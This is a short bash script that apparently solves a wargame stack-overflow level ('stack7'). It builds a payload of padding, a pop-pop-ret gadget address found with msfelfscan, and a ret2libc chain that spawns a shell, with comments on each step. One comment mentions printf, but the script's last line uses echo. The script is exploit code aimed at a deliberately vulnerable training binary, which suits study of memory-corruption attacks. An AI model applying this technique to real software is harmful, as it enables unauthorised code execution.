#!/bin/bash
encode() {
    printf "$1" | xxd -r -p
}

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

# Use msfelfscan from metasploit to analyze the binary
# Do `msfelfscan -p stack7` to list "pop pop ret" occurences
# Used the first one -- x08048492
poppopret=`encode 92840408`

# Provide some input for the two `pop` instructions
poppop="BBBBCCCC"

# See the previous solution for explanation
jmp=`encode b0ffecb7`
return_addr="AAAA"
shellpath=`encode bf63fbb7`

# Use `printf` instead of `echo` so the newline character is not included
echo "$offset$poppopret$poppop$jmp$return_addr$shellpath"
